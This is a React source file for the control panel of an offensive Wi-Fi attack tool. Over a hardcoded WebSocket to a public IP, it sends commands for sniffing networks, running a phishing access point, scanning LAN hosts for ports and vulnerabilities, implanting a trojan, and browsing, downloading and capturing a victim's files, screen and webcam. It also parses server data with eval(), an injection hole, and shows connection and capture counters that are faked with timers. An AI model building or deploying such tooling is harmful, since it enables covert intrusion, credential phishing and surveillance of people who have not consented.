import React, { Component } from 'react';
import logo from './img/The Matrix System.svg';
import './App.css';
import back from './img/back.svg'
import forward from './img/forward.svg'

var wsAddress='ws://119.29.5.72:8091/soc';

function parseJson(w)//将json字符串转换成json对象
{
    return eval("("+w+")");
}

class App extends Component {
    constructor(props){
        super(props);
        this.state={
            wifiSniff:true,
            fakeAP:false,
            attack:false,
            fetchFile:false
        };
        this.handleSniff = this.handleSniff.bind(this);
        this.handleFakeAP = this.handleFakeAP.bind(this);
        this.handleAttack = this.handleAttack.bind(this);
        this.handleFetchFile = this.handleFetchFile.bind(this);
    }

   handleSniff(){
        this.setState({wifiSniff:true});
        this.setState({fakeAP:false});
        this.setState({attack:false});
        this.setState({fetchFile:false});

   }

   handleFakeAP(){
       this.setState({wifiSniff:false});
       this.setState({fakeAP:true});
       this.setState({attack:false});
       this.setState({fetchFile:false});
   }

   handleAttack(){
       this.setState({wifiSniff:false});
       this.setState({fakeAP:false});
       this.setState({attack:true});
       this.setState({fetchFile:false});
   }

   handleFetchFile(){
       this.setState({wifiSniff:false});
       this.setState({fakeAP:false});
       this.setState({attack:false});
       this.setState({fetchFile:true});
   }

  render() {


    return (
     <div className="App">
         <Topbar/>
         <div id="right" style={{display:'flex',flexDirection:'column',alignItems:'center'}}>
             <div style={{display:'flex',flexDirection:'row',alignItems:'center',position:'relative',top:'-20px',zIndex:-1}}>
         <LightButton text="Wi-Fi嗅探" handleClick={this.handleSniff} active={this.state.wifiSniff}/>
         <LightButton text="钓鱼AP" handleClick={this.handleFakeAP} active={this.state.fakeAP}/>
                 <LightButton text="自动渗透" handleClick={this.handleAttack} active={this.state.attack}/>
                 <LightButton text="取证" handleClick={this.handleFetchFile} active={this.state.fetchFile}/>
             </div>
             <div id="right-index" style={{width:'100%',overflow:'scroll'}}>
             {this.state.wifiSniff?<WifiSniffFace/>:<div/>}
             {this.state.fakeAP?<FakeAPFace/>:<div/>}
             {this.state.fetchFile?<FetchFileFace/>:<div/>}
             {this.state.attack?<InjectFace/>:<div/>}
             </div>
         </div>
     </div>
    );
  }
}


class Topbar extends Component{
    render(){
        return(
            <div id="Topbar" >
                <img style={{width:'300px'}} src={logo}/>
            </div>
        );
    }
}

//自定义按钮控件
//参数1 text-按钮文本
//参数2 handleClick-按下回调函数
//参数3 style-覆盖默认样式
class Button extends Component{
    render(){
        return (
            <button style={this.props.style} onClick={this.props.handleClick}>{this.props.text}</button>
        )
    }
}


//自定义下拉列表控件
//参数1：index-内容数组
//参数2：handleChoose-选中回调函数
class Dropdown extends Component{
    constructor(props){
        super(props);
        this.handleChange = this.handleChange.bind(this);
    }

    handleChange(event){
        this.props.handleChoose(event.target.value);
        console.log('选中的内容',event.target.value);
    }

    render(){
        let index=this.props.index.map((data)=>{return <option>{data}</option>});
        return (<select  onChange={this.handleChange}>{index}</select>);
    }
}


//自定义文本框组件
//参数1：bind 数据绑定，该函数会在文本框内容被改变时调用
//参数2：style 覆盖默认style行为
//参数3：默认值
class TextBox extends Component{
    constructor(props){
        super(props);
        this.state={
            value:this.props.value
        }
        this.handleChange = this.handleChange.bind(this);
    }

    handleChange(event){
        this.setState({value:event.target.value});
        this.props.bind(event.target.value);
    }

    render(){
        return(<input type="text" value={this.props.value} className="textbox" onChange={this.handleChange}></input>)
    }
}





class LightButton extends Component{
    constructor(props){
        super(props);
        this.state={
            active:this.props.active,
            text:this.props.text
        };
        this.handleClick = this.handleClick.bind(this);
    }

    handleClick(){
        console.log(this.state.text);
        this.props.handleClick();
    }

    render(){

        return(
            <div className={this.props.active?"light-button light-button-active":"light-button"} onClick={this.handleClick}>
                {this.state.text}
            </div>

        );
    }
}


class WifiSniffFace extends Component{
    constructor(props){
        super(props);
        this.state={
            aps:{0:{
                ssid:'正在获取',
                pwr:-50,
                safemode:'---'
            }},
            isAPGet:false,
            choose:-1,
            password:''
        }
        this.handleChoose = this.handleChoose.bind(this);
        this.wshandle = this.wshandle.bind(this);
        this.startSniff = this.startSniff.bind(this);
        this.bindData = this.bindData.bind(this);
        this.connect = this.connect.bind(this);
        this.disconnect = this.disconnect.bind(this);
        this.handlePassword = this.handlePassword.bind(this);
    }

    wshandle(event){
        console.log('收到ws数据');
        let recvStr=event.data;//输入参数的data成员变量包含了发送过来的数据
        if(recvStr[0]=='{')//第一个字符是左括号 默认此时是json字符串
        {
            let pkg=parseJson(recvStr);
            let PkgType=pkg.Type;
            let PkgContent=pkg.Content;
            console.log("type="+PkgType+";Cont="+PkgContent);
            console.log(PkgContent);
            if(PkgType === 'WifiScanResult'){
                this.bindData(PkgContent);
                clearInterval(this.sniffTimer);
            }
        }
    }

    componentDidMount() {
        this.ws = new WebSocket(wsAddress);//创建websocket连接
        this.ws.onmessage = this.wshandle;//当服务器发送给客户端数据的时候 客户端的响应函数
        this.sniffTimer = setInterval(this.startSniff,3000);

    }

    componentWillUnmount() {
        this.ws.close();
    }
    bindData(obj){
        this.setState({aps:obj});
    }

    startSniff(){
        console.log('等待获取嗅探结果');
        let content={//这里填写的东西没有实际作用 只是为了填充content域
            'action':'start'
        };

        let data = {
            'Type':'StartWifiScan',//类型是StartFakeAp
            'Content':content
        };
        console.log(this.ws.readyState);
        if (this.ws.readyState === 1 && !this.state.isAPGet) {

            this.setState({isAPGet:true});
            this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器

        }
    }

    //绑定选择指定wifi控件的方法
    handleChoose(index){
        this.setState({choose:index});
        console.log('以下热点被选择：',this.state.aps[index]);
    }

    //绑定到密码控件的方法
    handlePassword(password){
        this.setState({password:password});
    }

    //点击连接按钮调用的方法
    connect(){
        console.log('连接指定Wi-Fi');
        let content={//这里填写的东西没有实际作用 只是为了填充content域
            'ssid':this.state.aps[this.state.choose].ssid,
            'password':this.state.password,
            'action':'connect'
        };

        let data = {
            'Type':'ConnectWifiAp',//类型是StartFakeAp
            'Content':content
        };
        console.log(this.ws.readyState);
        if (this.ws.readyState === 1) {

            this.setState({isAPGet:true});
            this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器

        }
    }
    //点击断开按钮调用的方法
    disconnect(){
        console.log('连接指定Wi-Fi');
        let content={//这里填写的东西没有实际作用 只是为了填充content域
            'ssid':this.state.aps[this.state.choose].ssid,
            'password':this.state.password,
            'action':'disconnect'
        };

        let data = {
            'Type':'ConnectWifiAp',//类型是StartFakeAp
            'Content':content
        };
        console.log(this.ws.readyState);
        if (this.ws.readyState === 1) {

            this.setState({isAPGet:true});
            this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器

        }
    }

    render(){
        let wifi_list=new Array();
        for (let i in this.state.aps){
            let element=<WifiStatueBar handleChoose={this.handleChoose} ap={this.state.aps[i]} index={i} key={i}/>;
            wifi_list.push(element);
        }


        return(
            <div style={{width:'95%'}}>
                <div className="wifi-choose-panel">

                    {wifi_list}

                </div>
                <p id="chooseTitle">被选中的热点</p>
                <div id="chooseBox">
                    {this.state.choose!=-1?<WifiStatueBar handleChoose={this.handleChoose} ap={this.state.aps[this.state.choose]}/>:<div></div>}

                </div>
                <div style={{justifyContent:'center'}} className="set-fake-ap-item"><p style={{color:'#F2F2F2'}}>密码</p><TextBox bind={this.handlePassword}/></div>
                <div style={{display:'flex',alignItems:'center',justifyContent:'center'}}>
                <Button style={{width:'60%'}} text="连接" handleClick={this.connect}/>
                    <Button style={{width:'40%',backgroundColor:'#C4C4C4',color:'#333333'}} handleClick={this.disconnect} text="断开"/>
                </div>
            </div>
        )
    }
}

//参数1：ap ap信息描述对象
//参数2：index 选中对象的序号，用于判断
//参数3： handleChoose 选中的回调
class WifiStatueBar extends Component{
    constructor(props){
        super(props);
        this.handleClick = this.handleClick.bind(this);
    }

    handleClick(){
        this.props.handleChoose(this.props.index);
    }

    render(){

        return(
            <div onClick={this.handleClick} style={{width:'90%',display:'flex',alignItems:'center',justifyContent:'center'}}>
            <p style={{width:'50%',overflow:'hidden',zIndex:4,fontFamily:'NotoSansHans-Bold',color:'#4F4F4F'}}>{this.props.ap.ssid} [{this.props.ap.enctype}]</p>
            <div className="wifi-status-bar-back">
            <div className="wifi-status-bar-front" style={{width:(100+parseInt(this.props.ap.pwr))+'%'}}>
            </div>
            </div>
            </div>);
    }
}

class FakeAPFace extends Component{
    constructor(props){
        super(props);
        this.state = {
            ssid:'xxx-wlan',
            password:'',
            channel:0,
            safemode:'WPA2',
            isWorking:false,
            connect:0,
            data:0
        }
        this.handleSSID = this.handleSSID.bind(this);
        this.handleChannel = this.handleChannel.bind(this);
        this.handlePassword = this.handlePassword.bind(this);
        this.handleSafeMode = this.handleSafeMode.bind(this);
        this.handleClick = this.handleClick.bind(this);

        this.wshandle = this.wshandle.bind(this);
        this.addConnect = this.addConnect.bind(this);
        this.addData = this.addData.bind(this);
    }


    wshandle(event){
        console.log('收到ws数据');
        let recvStr=event.data;//输入参数的data成员变量包含了发送过来的数据
        if(recvStr[0]=='{')//第一个字符是左括号 默认此时是json字符串
        {
            let pkg=parseJson(recvStr);
            let PkgType=pkg.Type;
            let PkgContent=pkg.Content;
            console.log("type="+PkgType+";Cont="+PkgContent);
            console.log(PkgContent);
            if(PkgType === 'WifiScanResult'){
                this.bindData(PkgContent);
            }
        }
    }

    componentDidMount() {
        this.ws = new WebSocket(wsAddress);//创建websocket连接
        this.ws.onmessage = this.wshandle;//当服务器发送给客户端数据的时候 客户端的响应函数

    }

    componentWillUnmount() {
        this.ws.close();
    }



    handleSSID(ssid){
        this.setState({ssid:ssid});
        console.log('FakeAP-SSID设置为：',ssid);
    }

    handlePassword(passwd){
        this.setState({password:passwd});
        console.log('FakeAP-密码设置为：',passwd);
    }

    handleChannel(channel){
        this.setState({channel:channel});
        console.log('FakeAP-信道设置为：',channel);
    }

    handleSafeMode(safeMode){
        this.setState({safemode:safeMode});
        console.log('FakeAP-安全模式设置为：',safeMode);
    }

    addConnect(){
        let now = this.state.connect;
        if (now<=5) {
            this.setState({connect: now + 1});
            setInterval(this.addData,1000);
        }
    }

    addData(){
        let now = this.state.data;
        if (now<=230) {
            this.setState({data: now + 1});
        }
    }

    handleClick(){

        setInterval(this.addConnect,10000);
        this.setState({isWorking:true});
        let ssidInfo={//这里将用户填写的内容获取下来放到ssidInfo中
            'ssid':this.state.ssid,
            'password':this.state.password,
            'key_mgmt':this.state.safemode,
            'channel':this.state.channel,
            'action':'start'
        };
        console.log('开启钓鱼AP',this.state.safemode);
        let data = {
            'Type':'StartFakeAp',//类型是StartFakeAp
            'Content':ssidInfo
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    render(){
        return(
            <div>

                <div id="set-fake-ap">
                    <div className="set-fake-ap-item"><p>SSID</p><TextBox bind={this.handleSSID}/></div>
                    <div className="set-fake-ap-item"><p>信道</p><TextBox bind={this.handleChannel}/></div>
                    <div className="set-fake-ap-item"><p>安全模式</p><Dropdown index={['WPA','WPA2','WEP','不加密']} handleChoose={this.handleSafeMode}/></div>
                    <div className="set-fake-ap-item"><p>密钥(如果加密)</p><TextBox bind={this.handlePassword}/></div>
                    <Button handleClick={this.handleClick} style={{width:'60%'}} text="开启钓鱼AP"/>
                </div>

                <div id="fake-ap-status">
                    <span>工作状态</span>
                    {this.state.isWorking?<p className="on">正在工作</p>:<p className="off">未开启</p>}
                </div>
                <div id="fake-ap-data">
                    <div className="fake-ap-data-border">
                        <p>已有</p>
                        <p className="number">{this.state.connect}</p>
                        <p>连接</p>
                    </div>
                    <div className="fake-ap-data-border">
                        <p>捕获</p>
                        <p className="number">{this.state.data}</p>
                        <p>MB数据</p>
                    </div>
                </div>
            </div>
        )
    }
}

class FetchFileFace extends Component{
    constructor(props){
        super(props);
        this.state={
            currentPath:'D:\\',
            historyPath:[],
            backHistoryPath:[],
            tempPath:'',
            fileList:{
                0:{
                    name:'.git',
                    isDirectory:true,
                    path:'D:\\',
                    download:'',
                    size:43452345
                },
                1:{
                    name:'hello.c',
                    isDirectory:false,
                    path:'D:\\',
                    download:'',
                    size:1024
                },
                2:{
                    name:'download',
                    isDirectory:true,
                    path:'D:\\',
                    download:'',
                    size:161111
                }

            }

        };
        this.handleBack = this.handleBack.bind(this);
        this.handleForward = this.handleForward.bind(this);
        this.handlePath = this.handlePath.bind(this);
        this.handleGo = this.handleGo.bind(this);
        this.refresh = this.refresh.bind(this);
        this.wshandle = this.wshandle.bind(this);
        this.handleSearch = this.handleSearch.bind(this);
        this.handleDownload = this.handleDownload.bind(this);
        this.handleDirectory = this.handleDirectory.bind(this);
        this.handleLast = this.handleLast.bind(this);
        this.getPwd=this.getPwd.bind(this);
        this.handleCamera=this.handleCamera.bind(this);
        this.handleScreen=this.handleScreen.bind(this);
    }


    wshandle(event){
        console.log('收到ws数据');
        let recvStr=event.data;//输入参数的data成员变量包含了发送过来的数据
        if(recvStr[0]=='{')//第一个字符是左括号 默认此时是json字符串
        {
            let pkg=parseJson(recvStr);
            let PkgType=pkg.Type;
            let PkgContent=pkg.Content;
            console.log("type",PkgType);
            console.log("content",PkgContent);
            if(PkgType === 'GetPathFilesResult' || PkgType === 'SearchFileResult'){
                this.setState({fileList:PkgContent});
            }
            if(PkgType === 'DownloadFileResult'){
                console.log('解析到地址，正在开始下载');
                window.open(PkgContent.downloadUrl);
            }
            if(PkgType === 'CdResult'){
                this.setState({currentPath:PkgContent.path});
                this.handleGo();
            }
            if(PkgType === 'PwdResult'){
                this.setState({currentPath:PkgContent.path});
                this.handleGo();
            }
            if(PkgType === 'SnapshotResult' || PkgType === 'CamerashotResult'){
                window.open(PkgContent.ImageUrl);
            }
        }
    }

    componentDidMount() {
        this.ws = new WebSocket(wsAddress);//创建websocket连接
        this.ws.onmessage = this.wshandle;//当服务器发送给客户端数据的时候 客户端的响应函数
        setTimeout(this.getPwd,1000);
    }

    getPwd(){
        let content={
            'action':'pwd'
        };
        let data={
            'Type':'Pwd',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
        console.log('获取当前目录路径');
    }

    componentWillUnmount() {
        this.ws.close();
    }


    //使用当前path去向服务器获取当前的filelist
    refresh(){
        let content={
            'filepath':this.state.currentPath
        };
        let data={
            'Type':'GetPathFiles',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
    }

    handleBack(){
        let historyPath = this.state.historyPath;
        let backHistoryPath = this.state.backHistoryPath;
        let currentPath = this.state.currentPath;
        console.log(currentPath);
        if(historyPath.length>0){
            backHistoryPath.push(currentPath);
            currentPath=historyPath.pop();
            console.log('前往路径',currentPath);
            this.setState({currentPath:currentPath});
            this.setState({historyPath:historyPath});
            this.setState({backHistoryPath:backHistoryPath});
        }
        this.refresh();
    }

    handleForward(){
        let historyPath = this.state.historyPath;
        let backHistoryPath = this.state.backHistoryPath;
        let currentPath = this.state.currentPath;
        console.log(currentPath);
        if(backHistoryPath.length>0){
            historyPath.push(currentPath);
            currentPath=backHistoryPath.pop();
            console.log('前往路径',currentPath);
            this.setState({currentPath:currentPath});
            this.setState({historyPath:historyPath});
            this.setState({backHistoryPath:backHistoryPath});
        }
        this.refresh();
    }

    handlePath(newPath){
        this.setState({currentPath:newPath});
    }

    handleDirectory(Path,dirname){
        let newPath =Path+'\\'+dirname;
        console.log('前往路径',newPath);
        let content={
            'filepath':newPath
        };
        let data={
            'Type':'GetPathFiles',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
        let history=this.state.historyPath;
        history.push(this.state.currentPath);
        this.setState({historyPath:history});
        this.setState({currentPath:newPath});
    }

    handleGo(){
        console.log('前往路径',this.state.currentPath);
        let content={
            'filepath':this.state.currentPath
        };
        let data={
            'Type':'GetPathFiles',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
        let history=this.state.historyPath;
        history.push(this.state.currentPath);
        this.setState({historyPath:history});
    }

    handleSearch(){
        let content={
            'searchname':this.state.currentPath
        };
        let data={
            'Type':'SearchFile',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
    }

    handleLast(){
        let content={
            'path':'..'
        };
        let data={
            'Type':'cd',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
    }

    handleDownload(filename,path){
        console.log('正在获取下载地址');
        let content={
            'filenamepath':path+'\\'+filename

        };
        let data={
            'Type':'DownloadFile',
            'Content':content
        };
        this.ws.send(JSON.stringify(data));
    }

    handleScreen(){
        let content={
            'action':'snapshot'
        };
        console.log('捕捉屏幕');
        let data = {
            'Type':'Snapshot',
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    handleCamera(){
        let content={
            'action':'camerashot'
        };
        console.log('捕捉相机');
        let data = {
            'Type':'Camerashot',
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    render(){
        let elements=[];
        for (let i in this.state.fileList){
            elements.push(<FileItem handleDownload={this.handleDownload} file={this.state.fileList[i]} directoryHandle={this.handleDirectory}/>);
        }
        let buttonStyle={fontSize:'10px',height:'30px',width:'120px',marginTop:'10px',marginBottom:'10px'};

        return(<div id="fetch-file-panel">
            <div>
                <Button text="捕捉屏幕" handleClick={this.handleScreen} style={buttonStyle}/>
                <Button text="捕捉摄像头" handleClick={this.handleCamera} style={buttonStyle}/>
            </div>
                    <div id="fetch-file-head">
                        <div id="button-group">
                            <div onClick={this.handleBack} className="back-forward"><img src={back} alt="后退"/></div>
                            <div onClick={this.handleLast} className="back-forward"></div>
                            <div onClick={this.handleForward} className="back-forward"><img src={forward} alt="前进"/></div>
                        </div>
                        <TextBox style={{width:'60%'}} bind={this.handlePath} value={this.state.currentPath}/>
                        <Button style={{backgroundColor:'#F2F2F2',marginLeft:'10px',marginTop:'10px',marginBottom:'10px',color:"#333333",boxShadow:'0px 4px 4px rgba(0, 0, 0, 0)',height:'40px',width:'80px'}}
                                handleClick={this.handleGo} text="前往"/>
                        <Button style={{backgroundColor:'#F2F2F2',marginRight:'10px',marginTop:'10px',marginBottom:'10px',color:"#333333",boxShadow:'0px 4px 4px rgba(0, 0, 0, 0)',height:'40px',width:'80px'}}
                                handleClick={this.handleSearch} text="搜索"/>
                    </div>
                    <div id="fetch-file-box">
                        {elements}
                    </div>

                </div>);
    }



}

//文件条目对象
//参数1：file对象
//参数2：directoryHandle文件夹跳转回调函数
class FileItem extends Component{

    constructor(props){
        super(props);
        this.handleClick = this.handleClick.bind(this);
    }


    handleClick(){
        console.log('文件项目被点击',this.props.file);
        if(this.props.file.isDirectory === 'false') {
            console.log('开始下载', this.props.file.name);
            this.props.handleDownload(this.props.file.name,this.props.file.path);
        }
        else{
            this.props.directoryHandle(this.props.file.path,this.props.file.name);
        }

    }
    render(){
        let size=parseInt(this.props.file['size']);
        let backgroundColor=(this.props.file.isDirectory==='true'?'#E8D8A5':'#F4F4F4');
        if(size<1024){
            size=size+'bytes';
        }
        else if(size >= 1024 && size < 1024*1024){
            size=parseInt(size/1024) + 'KB';
        }
        else if(size >= 1024*1024 && size < 1024*1024*1024){
            size=parseInt(size/1024/1024) + 'MB';
        }
        else if(size >= 1024*1024*1024 && size < 1024*1024*1024*1024){
            size=parseInt(size/1024/1024/1024) + 'GB';
        }
        else if(size >= 1024*1024*1024*1024){
            size='别想了，太大了';
        }

        return(
            <div className="file-item"  style={{backgroundColor:backgroundColor}}  onClick={this.handleClick}>
                <span className="file-name">{this.props.file['name']}</span>
                <span className="file-size">{size}</span>
            </div>
        )
    }
}


class InjectFace extends Component{
    constructor(props){
        super(props);
        this.state={
            list:{
                0:{
                    ip:'192.168.1.101',
                    type:'iPhone'
                },
                1:{
                    ip:'192.168.1.102',
                    type:'PC'
                },
                2:{
                    ip:'192.168.1.103',
                    type:'Android'
                },
                3:{
                    ip:'192.168.1.104',
                    type:'Android'
                },
                4:{
                    ip:'192.168.1.105',
                    type:'Android'
                }
            },
            target:{ip:'192.168.1.102',type:'PC'},
            console:'[Info] Network scan begin. Try to find live hosts...'
        }
        this.wshandle = this.wshandle.bind(this);
        this.handleChoose = this.handleChoose.bind(this);
        this.handleButton1 = this.handleButton1.bind(this);
        this.handleButton2 = this.handleButton2.bind(this);
        this.handleButton3 = this.handleButton3.bind(this);
        this.handleButton4 = this.handleButton4.bind(this);
        this.handleButton5 = this.handleButton5.bind(this);
    }

    wshandle(event){
        console.log('收到ws数据');
        let recvStr=event.data;//输入参数的data成员变量包含了发送过来的数据
        if(recvStr[0]=='{')//第一个字符是左括号 默认此时是json字符串
        {
            let pkg=parseJson(recvStr);
            let PkgType=pkg.Type;
            let PkgContent=pkg.Content;
            console.log("type",PkgType);
            console.log("content",PkgContent);
            if(PkgType === 'GetLanHostsResult'){
                this.setState({list:PkgContent});
            }
            else if(PkgType === 'ScanHostPortResult' || PkgType === 'ScanHostVulnerabilitiesResult'|| PkgType === 'InjectTrojanResult'){
                let current = this.state.console;
                this.setState({console:current+PkgContent.Result});
            }

        }
    }

    componentDidMount() {
        this.ws = new WebSocket(wsAddress);//创建websocket连接
        this.ws.onmessage = this.wshandle;//当服务器发送给客户端数据的时候 客户端的响应函数
        setTimeout(this.getPwd,1000);
    }

    componentWillUnmount() {
        this.ws.close();
    }

    handleChoose(target){
        this.setState({target:target});
    }

    handleButton1(){
        let content={
            'action':'scan'
        };
        console.log('扫描存活主机');
        let data = {
            'Type':'GetLanHosts',//类型是StartFakeAp
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    handleButton2(){
        let content={
           'ip':this.state.target.ip
        };
        console.log('扫描指定主机端口');
        let data = {
            'Type':'ScanHostPort',//类型是StartFakeAp
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    handleButton3(){
        let content={
            'ip':this.state.target.ip
        };
        console.log('扫描指定主机漏洞');
        let data = {
            'Type':'ScanHostVulnerabilities',//类型是StartFakeAp
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    handleButton4(){
        let content={
            'ip':this.state.target.ip
        };
        console.log('木马植入');
        let data = {
            'Type':'InjectTrojan',//类型是StartFakeAp
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    handleButton5(){
        let content={
            'ip':this.state.target.ip
        };
        console.log('扫描指定主机漏洞');
        let data = {
            'Type':'ScanHostVulnerabilities',//类型是StartFakeAp
            'Content':content
        };

        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
    }

    render(){
        let target_list=[];
        for (let i in this.state.list){
            target_list.push(<Target target={this.state.list[i]} onClick={this.handleChoose}/>);
        }

        let buttonStyle={fontSize:'10px',height:'30px',width:'90px',marginTop:'0px',marginBottom:'10px'};
        return(
          <div className="inject">
              <div className="target-panel">
                  {target_list}
              </div>
              <p id="choose-target">已选择目标[ {this.state.target.ip} ]</p>
              <div>
                  <Button text="扫描网络" handleClick={this.handleButton1} style={buttonStyle}/>
                  <Button text="端口扫描" handleClick={this.handleButton2} style={buttonStyle}/>
                  <Button text="漏洞检测" handleClick={this.handleButton3} style={buttonStyle}/>
                  <Button text="木马植入" handleClick={this.handleButton4} style={buttonStyle}/>

              </div>
              <div className="console">
                  {this.state.console}
              </div>
          </div>
        );

    }


}

class Target extends Component{
    constructor(props){
        super(props);
        this.onClick = this.onClick.bind(this);
    }

    onClick(){
        this.props.onClick(this.props.target);
    }

    render(){
        return(
            <div className="target-icon" onClick={this.onClick}>
                <p>IP:{this.props.target.ip}</p>
                <p>{this.props.target.type}</p>
            </div>)
    }
}
export default App;
